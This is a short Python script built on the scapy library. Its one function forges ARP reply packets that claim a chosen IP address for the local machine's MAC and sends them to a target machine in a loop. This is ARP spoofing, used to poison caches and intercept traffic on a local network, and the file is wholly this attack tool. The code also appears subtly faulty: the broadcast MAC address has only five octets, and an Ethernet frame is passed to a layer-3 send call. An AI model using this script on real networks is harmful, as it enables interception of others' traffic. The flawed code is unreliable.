from scapy.all import send, ARP, Ether
import uuid

def spoof(target_address: str, spoof_address: str, ping_number: int):
 
    mac_node = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac = ":".join(mac_node[i:i+2] for i in range(0, 12, 2))

    spoof_arp_ping = Ether(dst="ff:ff:ff:ff:ff")/ARP(op=2,pdst=target_address,psrc=spoof_address,hwsrc=mac)

    for i in range(0,ping_number):
        send(spoof_arp_ping,verbose=False)


